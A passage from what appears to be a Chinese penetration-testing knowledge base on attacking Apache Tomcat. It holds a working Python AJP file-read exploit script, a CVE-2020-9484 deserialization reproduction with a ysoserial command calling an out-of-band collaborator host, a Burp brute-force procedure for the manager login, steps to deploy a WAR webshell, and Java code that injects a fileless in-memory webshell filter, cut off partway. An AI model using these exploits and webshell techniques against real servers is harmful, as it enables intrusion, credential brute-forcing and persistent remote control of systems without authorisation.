raw_packet): stream = StringIO(raw_packet) self.magic1, self.magic2, data_len = unpack(stream, \"bbH\") self.prefix_code, self.method = unpack(stream, \"bb\") self.protocol = unpack_string(stream) self.req_uri = unpack_string(stream) self.remote_addr = unpack_string(stream) self.remote_host = unpack_string(stream) self.server_name = unpack_string(stream) self.server_port = unpack(stream, \">h\") self.is_ssl = unpack(stream, \"?\") self.num_headers, = unpack(stream, \">H\") self.request_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code > 0xA000: h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001] else: h_name = unpack(stream, \"%ds\" % code) stream.read(1) # \\0 h_value = unpack_string(stream) self.request_headers[h_name] = h_value def send_and_receive(self, socket, stream, save_cookies=False): res = [] i = socket.sendall(self.serialize()) if self.method == AjpForwardRequest.POST: return res r = AjpResponse.receive(stream) assert r.prefix_code == AjpResponse.SEND_HEADERS res.append(r) if save_cookies and 'Set-Cookie' in r.response_headers: self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie'] # read body chunks and end response packets while True: r = AjpResponse.receive(stream) res.append(r) if r.prefix_code == AjpResponse.END_RESPONSE: break elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK: continue else: raise NotImplementedError break return res class AjpResponse(object): _, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range( 7) COMMON_SEND_HEADERS = [ \"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\", \"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\" ] def parse(self, stream): # read headers self.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\") if self.prefix_code == AjpResponse.SEND_HEADERS: self.parse_send_headers(stream) elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK: self.parse_send_body_chunk(stream) elif self.prefix_code == AjpResponse.END_RESPONSE: self.parse_end_response(stream) elif self.prefix_code == AjpResponse.GET_BODY_CHUNK: self.parse_get_body_chunk(stream) else: raise NotImplementedError def parse_send_headers(self, stream): self.http_status_code, = unpack(stream, \">H\") self.http_status_msg = unpack_string(stream) self.num_headers, = unpack(stream, \">H\") self.response_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code H\") self.data = stream.read(self.data_length+1) def parse_end_response(self, stream): self.reuse, = unpack(stream, \"b\") def parse_get_body_chunk(self, stream): rlen, = unpack(stream, \">H\") return rlen @staticmethod def receive(stream): r = AjpResponse() r.parse(stream) return r def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET): fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER) fr.method = method fr.protocol = \"HTTP/1.1\" fr.req_uri = req_uri fr.remote_addr = target_host fr.remote_host = None fr.server_name = target_host fr.server_port = 80 fr.request_headers = { 'SC_REQ_ACCEPT': 'text/html', 'SC_REQ_CONNECTION': 'keep-alive', 'SC_REQ_CONTENT_LENGTH': '0', 'SC_REQ_HOST': target_host, 'SC_REQ_USER_AGENT': 'Mozilla', 'Accept-Encoding': 'gzip, deflate, sdch', 'Accept-Language': 'en-US,en;q=0.5', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'max-age=0' } fr.is_ssl = False fr.attributes = [] return fr class Tomcat(object): def __init__(self, target_host, target_port): self.target_host = target_host self.target_port = target_port self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.connect((target_host, target_port)) self.stream = self.socket.makefile(\"rb\", bufsize=0) def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[], lfi=False): if lfi: self.req_uri = req_uri + '.jspx' else: self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request( self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method)) print(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) if user is not None and password is not None: self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + ( \"%s:%s\" % (user, password)).encode('base64').replace('\\n', '') for h in headers: self.forward_request.request_headers[h] = headers[h] for a in attributes: self.forward_request.attributes.append(a) responses = self.forward_request.send_and_receive( self.socket, self.stream) if len(responses) == 0: return None, None snd_hdrs_res = responses[0] data_res = responses[1:-1] if len(data_res) == 0: print(\"No data in response. Headers:%s\\n\" % snd_hdrs_res.response_headers) return snd_hdrs_res, data_res parser = argparse.ArgumentParser() parser.add_argument(\"target\", type=str, help=\"Hostname or IP to attack\") parser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\") parser.add_argument('-w', '--webapp', type=str, default='ROOT', help=\"Which webapp to attack (default is ROOT\") parser.add_argument('-f', '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\") parser.add_argument('-l', '--lfi', action=\"store_true\", help=\"local file include\") args = parser.parse_args() t = Tomcat(args.target, args.port) _, data = t.perform_request('/'+args.webapp+'/', attributes=[ {'name': 'req_attribute', 'value': [ 'javax.servlet.include.request_uri', '/']}, {'name': 'req_attribute', 'value': [ 'javax.servlet.include.path_info', args.file]}, {'name': 'req_attribute', 'value': [ 'javax.servlet.include.servlet_path', '/']}, ], lfi=args.lfi) print('----------------------------') print(\"\".join([d.data for d in data])) 参考链接 https://forum.90sec.com/t/topic/801 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:54 "},"Web安全/Tomcat/（CVE-2020-9484）Tomcat session反序列化漏洞/（CVE-2020-9484）Tomcat session反序列化漏洞.html":{"url":"Web安全/Tomcat/（CVE-2020-9484）Tomcat session反序列化漏洞/（CVE-2020-9484）Tomcat session反序列化漏洞.html","title":"（CVE-2020-9484）Tomcat session反序列化漏洞","keywords":"","body":"（CVE-2020-9484）Tomcat session反序列化漏洞 一、漏洞简介 对 于一个企业级应用而言，Session对象的管理十分重要。Sessio对象的信息一般情况下置于服务器的内存中，当服务器由于故障重启，或应用重新加载 时候，此时的Session信息将全部丢失。为了避免这样的情况，在某些场合可以将服务器的Session数据存放在文件系统或数据库中，这样的操作称为 Session对象的持久化。Session对象在持久化时，存放在其中的对象以序列化的形式存放，这就是为什么一般存放在Session中的数据需要实 现可序列化接口（java.io.Serializable）的原因了。当一个Session开始时，Servlet容器会为Session创建一个HttpSession对象。Servlet容器在某些情况下把这些 HttpSession对象从内存中转移到文件系统或数据库中，在需要访问 HttpSession信息时再把它们加载到内存中。 实现 要完成session持久化，存放在session里的对象必须要实现java.io.Serializable 接口。Session的持久化是由Session Manager来管理的。Tomcat提供了两个实现类： org.apache.catalina.session.StandardManager (默认) org.apache.catalina.session.PersistentManager 配置 存储在本地文件中需要配置conf目录里的context.xml文件在节点下添加如下节点： 二、漏洞影响 Tomca \\ 三、复现过程 漏洞分析 一般文件存储session的问题就是sessionID没有做过滤，允许跳出路径，让session文件变成攻击者控制的文件，导致漏洞产生，这次的session漏洞也不例外 我们选择了session的存储为FileStore，所以在FileStore类的load方法处设置断点 在servlet中创建一个很简单的java session protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { Properties properties = new Properties(); properties.setProperty(\"org.apache.catalina.session.StandardSession.ACTIVITY_CHECK\", \"true\"); System.setProperties(properties); String res = System.getProperty(\"org.apache.catalina.session.StandardSession.ACTIVITY_CHECK\"); System.out.println(res); HttpSession httpSession = req.getSession(); httpSession.setAttribute(\"username\", \"admin\"); resp.getWriter().println(\"success\"); } 现在我们的漏洞环境就搭建好了，设置tomcat启动即可 设置sessionid 我们设置sessionid存在目录穿越符号 Tomcatsession反序列化漏洞/media/rId28.png) 刷新页面，被断点拦截 Tomcatsession反序列化漏洞/media/rId29.png) 第一步先是获取到session文件 Tomcatsession反序列化漏洞/media/rId30.png) 可以看到，我们的sessionID后面会添加一个.session后缀，这也就导致我们需要一个可控文件名的文件上传，这一点就比较难以满足 但是可以看出来，不需要准确知道确定的相对录路径，一直跳到根目录即可，但是因为sessionid有长度限制的，所以还是有一点限制 反序列化 这个时候，我们可以跳到任意目录了，我们在tmp下面生成了URLDNS的ysoserial，来做dns查询 java -jar ysoserial.jar URLDNS \"http://lsh9lo0bpipjrb0kp98cn4khb8h15q.burpcollaborator.net\" > /tmp/test.session Tomcatsession反序列化漏洞/media/rId32.png) 只要这个session文件存在，就会将文件内容读取出来，并且创建ObjectInputStream，最后调用了readObjectData 熟悉java反序列化的话这个地方一眼就能看出来有反序列化的问题 我们继续进入readObjectData Tomcatsession反序列化漏洞/media/rId33.png) 调用readObject，触发反序列化 利用截图 使用URLDNS，成功获取到DNS请求 Tomcatsession反序列化漏洞/media/rId35.png) 漏洞利用条件较为苛刻 参考链接 https://xz.aliyun.com/t/7803\\#toc-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:58 "},"Web安全/Tomcat/Tomcat 后台爆破/Tomcat 后台爆破.html":{"url":"Web安全/Tomcat/Tomcat 后台爆破/Tomcat 后台爆破.html","title":"Tomcat 后台爆破","keywords":"","body":"Tomcat 后台爆破 一、漏洞简介 二、漏洞影响 三、复现过程 在渗透测试中，我们经常遇到tomcat后台被默认部署在外部的情况，类似于http://192.168.3.204:8080/host-manager/html 在这种情况下，我们都会选择去爆破来进入后台部署shell。 先抓取一下我们的登录包： GET /host-manager/html HTTP/1.1 Host: 192.168.3.204:8080 User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0 FirePHP/0.7.4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 x-insight: activate Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46MTIzNDU2 在Tomcat后台登录的数据包中我们发现它会将输入的账号和密码都编码成Base64密文。 格式：用户名:密码 => admin:123456 => YWRtaW46MTIzNDU2 这里我们可以采用Metasploit中的tomcat爆破辅助模块，当然也可以用BurpSuite来爆破： 将数据包发送到Intruder模块，添加一个变量： 在设置Payload的时候要使用自定义迭代器： 由于登录令牌都是base64加密的，我们需要 [用户名]:[密码]这样的格式进行base64encde才可以发送出去，我们设置三个迭代payload分别代表：用户名、:、密码、。 第一位设置用户名这类的字典，可以多个。 第二位设置:，只需要一个即可。 第三位设置密码，可以多个。 然后设置一个编码器，选择base64这个函数： 接下来再将url编码去掉，因为在base64密文里=会被编码成%3d。 设置完毕后，我们可以爆破了： 参考链接 https://payloads.online/archivers/2017-08-17/2\\#tomcat-%E7%88%86%E7%A0%B4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:29 "},"Web安全/Tomcat/Tomcat 后台部署war木马getshell/Tomcat 后台部署war木马getshell.html":{"url":"Web安全/Tomcat/Tomcat 后台部署war木马getshell/Tomcat 后台部署war木马getshell.html","title":"Tomcat 后台部署war木马getshell","keywords":"","body":"Tomcat 后台部署war木马getshell 一、漏洞简介 二、漏洞影响 三、复现过程 在获取到令牌后，我们可以进入Tomcat后台了： 在这个后台，我们可以操作每个应用的状态......以及读取每个应用下的Session。 但是这都不是最大的安全隐患 :) 下面来讲一下如何制作war包。 war包：Java web工程，都是打成war包，进行发布，如果我们的服务器选择TOMCAT等轻量级服务器，一般就打出WAR包进行发布 先准备了一个JSP的一句话木马，安装好JDK环境，我的目录是在C:\\Program Files (x86)\\Java\\jdk1.8.0_131\\bin,这个目录下又个文件叫jar.exe。 执行:jar -cvf [war包名称].war 打包目录 我们现在已经打包好了一个WAR包。 找到Tomcat管理页面中的WAR file to deploy进行上传就可以部署了。 应用列表已经出现了我们的目录： 访问文件名即可： ##参考链接 https://payloads.online/archivers/2017-08-17/2\\#tomcat-%E7%88%86%E7%A0%B4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:32 "},"Web安全/Tomcat/Tomcat样例目录session操纵漏洞/Tomcat样例目录session操纵漏洞.html":{"url":"Web安全/Tomcat/Tomcat样例目录session操纵漏洞/Tomcat样例目录session操纵漏洞.html","title":"Tomcat样例目录session操纵漏洞","keywords":"","body":"Tomcat样例目录session操纵漏洞 一、漏洞简介 在Apache tomcat中，有一个默认的example示例目录，该example目录中存着众多的样例，其中/examples/servlets/servlet/SessionExample 允许用户对Session进行操作。由于Session是存储在服务器端的用于验证用户身份的东西。所以，理论上，只要我们可以操控Session，就可以伪造任意用户身份信息。 二、漏洞影响 三、复现过程 如图，是Apache tomcat 网站根目录下的文件夹，默认是有一个examples目录的 这是examples目录下的文件 我们访问该SessionExample页面，该页面可以对Session进行操控，本来该页面是Apache tomcat用来给开发者操纵Session示例的页面。但是，如果实际生产环境中不删除该页面的话，可能存在伪造任意用户身份的漏洞。 http://127.0.0.1:8080/examples/servlets/servlet/SessionExample 那么我们来看看SessionExample页面是如何通过接收用户输入的值，来对Session进行控制的。 表单部分代码，接收用户输入的Name和Value值。 out.println(\"\"); out.print(\"\"); out.println(rb.getString(\"sessions.dataname\")); out.println(\"\"); out.println(\"\"); out.println(rb.getString(\"sessions.datavalue\")); out.println(\"\"); out.println(\"\"); out.println(\"\"); out.println(\"\"); 核心代码，将接收的用户输入的Name和Value值写入到Session中 HttpSession session = request.getSession(true); out.println(rb.getString(\"sessions.id\") + \" \" +session.getId()); out.println(\"\"); out.println(rb.getString(\"sessions.created\") + \" \"); out.println(new Date(session.getCreationTime()) +\"\"); out.println(rb.getString(\"sessions.lastaccessed\") + \"\"); out.println(new Date(session.getLastAccessedTime())); String dataName = request.getParameter(\"dataname\");//获取dataname参数的值 String dataValue = request.getParameter(\"datavalue\");//获取datavalue参数的值 if (dataName != null && dataValue != null) { session.setAttribute(dataName, dataValue);//将dataname和datavalue写入session } 也就是说，用户通过表单提交Name和Value参数，然后通过request.getParameter（）函数获取这两个参数的值，再通过session.setAttribute() 函数将Name和Value的值写入Session中。 漏洞示例 我们先来编写 login.jsp 、login_check.jsp 、 index.jsp 这三个页面，通过这三个页面来模拟一般网站身份验证的过程。 login.jsp 用户名: 密码: login_check.jsp index.jsp 我们直接打开网站后台，即 index.jsp http://127.0.0.1:8080/examples/index.jsp 发现被重定向到login.jsp了。因为我们没有登录，所以被重定向到了登录页面 打开SessionExample http://127.0.0.1:8080/examples/servlets/servlet/SessionExample 在Name of Session Attribute: 里输入 login 在Value of Session Attribute:里输入 admin 提交后显示login=admin已经写入session 再次打开index.jsp，显示成功登录 注：但是在现实生产环境中，我们很难知道服务器后端的Session中是通过什么参数(Name)和值(Value)来判断用户登录状态的。所以就是我们根本很难利用该页面来进行任意用户伪造，只是说理论上是可行的。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:34 "},"Web安全/Tomcat/基于Tomcat的内存Webshell 无文件攻击技术/基于Tomcat的内存Webshell 无文件攻击技术.html":{"url":"Web安全/Tomcat/基于Tomcat的内存Webshell 无文件攻击技术/基于Tomcat的内存Webshell 无文件攻击技术.html","title":"基于Tomcat的内存Webshell 无文件攻击技术","keywords":"","body":"基于Tomcat的内存Webshell 无文件攻击技术 0x01 tomcat通用的获取request和response 首先我们看看一个普通http请求进来的时候，tomcat的部分执行栈： at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:806) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1498) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:745) 按照kingkk师傅的方法，利用的点是在 org.apache.catalina.core.ApplicationFilterChain.internalDoFilter： if (ApplicationDispatcher.WRAP_SAME_OBJECT) { lastServicedRequest.set(request); lastServicedResponse.set(response); } 其中，通过反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化，之后，每次请求进来，就能通过这两个ThreadLocal获取到相应的request和response了。但是，也存在一点小限制，在其set之前，看： private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException { // Call the next filter if there is one if (pos 先执行完所有的Filter了filter.doFilter(request, response, this) 因此，对于shiro的反序列化利用就没办法通过这种方式取到response回显了。 0x02 动态注册Filter 没错的，正如标题所说，通过动态注册一个Filter，并且把其放到最前面，这样，我们的Filter就能最先执行了，并且也成为了一个内存Webshell了。 要实现动态注册Filter，需要两个步骤。第一个步骤就是先达到能获取request和response，而第二个步骤是通过request或者response去动态注册Filter 步骤一 首先，我们创建一个继承AbstractTranslet（因为需要携带恶意字节码到服务端加载执行）的TomcatEchoInject类，在其静态代码块中反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; /** * @author threedr3am */ public class TomcatEchoInject extends AbstractTranslet { static { try { /*刚开始反序列化后执行的逻辑*/ //修改 WRAP_SAME_OBJECT 值为 true Class c = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); java.lang.reflect.Field f = c.getDeclaredField(\"WRAP_SAME_OBJECT\"); java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (!f.getBoolean(null)) { f.setBoolean(null, true); } //初始化 lastServicedRequest c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); f = c.getDeclaredField(\"lastServicedRequest\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } //初始化 lastServicedResponse f = c.getDeclaredField(\"lastServicedResponse\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } } catch (Exception e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 接着，我们改造一下ysoserial中的Gadgets.createTemplatesImpl方法 public static Object createTemplatesImpl ( final String command) throws Exception { return createTemplatesImpl(command, null); } public static Object createTemplatesImpl ( final String command, final Class c ) throws Exception { if ( Boolean.parseBoolean(System.getProperty(\"properXalan\", \"false\")) ) { return createTemplatesImpl( command, c, Class.forName(\"org.apache.xalan.xsltc.trax.TemplatesImpl\"), Class.forName(\"org.apache.xalan.xsltc.runtime.AbstractTranslet\"), Class.forName(\"org.apache.xalan.xsltc.trax.TransformerFactoryImpl\")); } return createTemplatesImpl(command, c, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class); } public static T createTemplatesImpl ( final String command, Class c, Class tplClass, Class abstTranslet, Class transFactory ) throws Exception { final T templates = tplClass.newInstance(); final byte[] classBytes; if (c == null) { // use template gadget class ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(StubTransletPayload.class)); pool.insertClassPath(new ClassClassPath(abstTranslet)); final CtClass clazz = pool.get(StubTransletPayload.class.getName()); // run command in static initializer // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" + command.replaceAll(\"\\\\\\\\\", \"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") + \"\\\");\"; clazz.makeClassInitializer().insertAfter(cmd); // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion) clazz.setName(\"ysoserial.Pwner\" + System.nanoTime()); CtClass superC = pool.get(abstTranslet.getName()); clazz.setSuperclass(superC); classBytes = clazz.toBytecode(); } else { classBytes = ClassFiles.classAsBytes(c); } // inject class bytes into instance Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][] { classBytes, ClassFiles.classAsBytes(Foo.class) }); // required to make TemplatesImpl happy Reflections.setFieldValue(templates, \"_name\", \"Pwnr\"); Reflections.setFieldValue(templates, \"_tfactory\", transFactory.newInstance()); return templates; } 可以看到，第二个传入的Class参数，我们并没有用到javassist，而是直接转字节数组，然后放到TemplatesImpl实例的_bytecodes字段中了。 最后，回到ysoserial中有调用Gadgets.createTemplatesImpl的payload类中来，我这边对每一个都做了拷贝修改，例如CommonsCollections11，我拷贝其修改后的类为CommonsCollections11ForTomcatEchoInject，在调用Gadgets.createTemplatesImpl(command[0];的地方，改成了final Object templates = Gadgets.createTemplatesImpl(null, TomcatEchoInject.class); 并且，对ysoserial的main入口做一点小修改，因为原来的代码规定必须要有payload的入参，而我们这里不需要了 ysoserial.GeneratePayload#main： if (args.length 在ysoserial执行maven指令生成jar包 mvn clean -Dmaven.test.skip=true compile assembly:assembly 这样，我们就能使用这个新的payload（CommonsCollections11ForTomcatEchoInject）了 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatEchoInject > ~/tmp/TomcatShellInject.ysoserial 步骤二 在使用步骤一生成的序列化数据进行反序列化攻击后，我们就能通过下面这段代码获取到request和response对象了 java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal t = (ThreadLocal) f.get(null); //不为空则意味着第一次反序列化的准备工作已成功 ServletRequest servletRequest = (ServletRequest) t.get() 接着，我们要做的就是动态注册Filter到tomcat中，参考《动态注册之Servlet+Filter+Listener》，可以看到，其中通过ServletContext对象（实际获取的是ApplicationContext，是ServletContext的实现，因为门面模式的使用，后面需要提取实际实现），实现了动态注册Filter javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(\"threedr3am\", threedr3am); filterRegistration.setInitParameter(\"encoding\", \"utf-8\"); filterRegistration.setAsyncSupported(false); filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{\"/*\"}); 然而实际上并不管用，为什么呢？ private Dynamic addFilter(String filterName, String filterClass, Filter filter) throws IllegalStateException { if (filterName != null && !filterName.equals(\"\")) { if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) { throw new IllegalStateException(sm.getString(\"applicationContext.addFilter.ise\", new Object[]{this.getContextPath()})); } else { FilterDef filterDef = this.context.findFilterDef(filterName); if (filterDef == null) { filterDef = new FilterDef(); filterDef.setFilterName(filterName); this.context.addFilterDef(filterDef); } else if (filterDef.getFilterName() != null && filterDef.getFilterClass() != null) { return null; } if (filter == null) { filterDef.setFilterClass(filterClass); } else { filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); } return new ApplicationFilterRegistration(filterDef, this.context); } } else { throw new IllegalArgumentException(sm.getString(\"applicationContext.invalidFilterName\", new Object[]{filterName})); } } 因为this.context.getState()在运行时返回的state已经是LifecycleState.STARTED了，所以直接就抛异常了，filter根本就添加不进去。 不过问题不大，因为this.context.getState()获取的是ServletContext实现对象的context字段，从其中获取出state，那么，我们在其添加filter前，通过反射设置成LifecycleState.STARTING_PREP，在其顺利添加完成后，再把其恢复成LifecycleState.STARTE，这里必须要恢复，要不然会造成服务不可用。 其实上面的反射设置state值，也可以不做，因为我们看代码中，只是执行了this.context.addFilterDef(filterDef)，我们完全也可以通过反射context这个字段自行添加filterDef。 在实际执行栈中，可以看到，实际filter的创建是在org.apache.catalina.core.StandardWrapperValve#invoke执行ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);的地方 跟进其实现方法，忽略不重要的代码： ... StandardContext context = (StandardContext) wrapper.getParent(); FilterMap filterMaps[] = context.findFilterMaps(); ... // Add the relevant path-mapped filters to this filter chain for (int i = 0; i 可以看到，从context提取了FilterMap数组，并且遍历添加到filterChain，最终生效，但是这里有两个问题： 我们最早创建的filter被封装成FilterDef添加到了context的filterDefs中，但是filterMaps中并不存在 跟上述一样的问题，也不存在filterConfigs中（context.findFilterConfig是从context的filterConfigs中获取） 这两个问题，也比较简单，第一个问题，其实在下面代码执行filterRegistration.addMappingForUrlPatterns的时候已经添加进去了 javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(\"threedr3am\", threedr3am); filterRegistration.setInitParameter(\"encoding\", \"utf-8\"); filterRegistration.setAsyncSupported(false); filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{\"/*\"}); public void addMappingForUrlPatterns(EnumSet dispatcherTypes, boolean isMatchAfter, String... urlPatterns) { FilterMap filterMap = new FilterMap(); filterMap.setFilterName(this.filterDef.getFilterName()); if (dispatcherTypes != null) { Iterator var5 = dispatcherTypes.iterator(); while(var5.hasNext()) { DispatcherType dispatcherType = (DispatcherType)var5.next(); filterMap.setDispatcher(dispatcherType.name()); } } if (urlPatterns != null) { String[] var9 = urlPatterns; int var10 = urlPatterns.length; for(int var7 = 0; var7 而第二个问题，既然没有，我们就反射加进去就行了，不过且先看看StandardContext，它有一个方法filterStart public boolean filterStart() { if (this.getLogger().isDebugEnabled()) { this.getLogger().debug(\"Starting filters\"); } boolean ok = true; synchronized(this.filterConfigs) { this.filterConfigs.clear(); Iterator var3 = this.filterDefs.entrySet().iterator(); while(var3.hasNext()) { Entry entry = (Entry)var3.next(); String name = (String)entry.getKey(); if (this.getLogger().isDebugEnabled()) { this.getLogger().debug(\" Starting filter '\" + name + \"'\"); } try { ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(this, (FilterDef)entry.getValue()); this.filterConfigs.put(name, filterConfig); } catch (Throwable var8) { Throwable t = ExceptionUtils.unwrapInvocationTargetException(var8); ExceptionUtils.handleThrowable(t); this.getLogger().error(sm.getString(\"standardContext.filterStart\", new Object[]{name}), t); ok = false; } } return ok; } } 没错，它遍历了filterDefs，一个个实例化成ApplicationFilterConfig添加到filterConfigs了。 这两个问题解决了，是不是就完成了呢，其实还没有，还差一个优化的地方，因为我们想要把filter放到最前面，在所有filter前执行，从而解决shiro漏洞的问题。 也简单，我们看回org.apache.catalina.core.ApplicationFilterFactory#createFilterChain的代码： // Add the relevant path-mapped filters to this filter chain for (int i = 0; i 创建的顺序是根据filterMaps的顺序来的，那么我们就有必要去修改我们添加的filter顺序到第一位了，最后，整个第二步骤的代码如下： import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; /** * @author threedr3am */ public class TomcatShellInject extends AbstractTranslet implements Filter { static { try { /*shell注入，前提需要能拿到request、response等*/ java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class .getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal t = (ThreadLocal) f.get(null); ServletRequest servletRequest = null; //不为空则意味着第一次反序列化的准备工作已成功 if (t != null && t.get() != null) { servletRequest = (ServletRequest) t.get(); } if (servletRequest != null) { javax.servlet.ServletContext servletContext = servletRequest.getServletContext(); org.apache.catalina.core.StandardContext standardContext = null; //判断是否已有该名字的filter，有则不再添加 if (servletContext.getFilterRegistration(\"threedr3am\") == null) { //遍历出标准上下文对象 for (; standardContext == null; ) { java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField(\"context\"); contextField.setAccessible(true); Object o = contextField.get(servletContext); if (o instanceof javax.servlet.ServletContext) { servletContext = (javax.servlet.ServletContext) o; } else if (o instanceof org.apache.catalina.core.StandardContext) { standardContext = (org.apache.catalina.core.StandardContext) o; } } if (standardContext != null) { //修改状态，要不然添加不了 java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\"state\"); stateField.setAccessible(true); stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP); //创建一个自定义的Filter马 Filter threedr3am = new TomcatShellInject(); //添加filter马 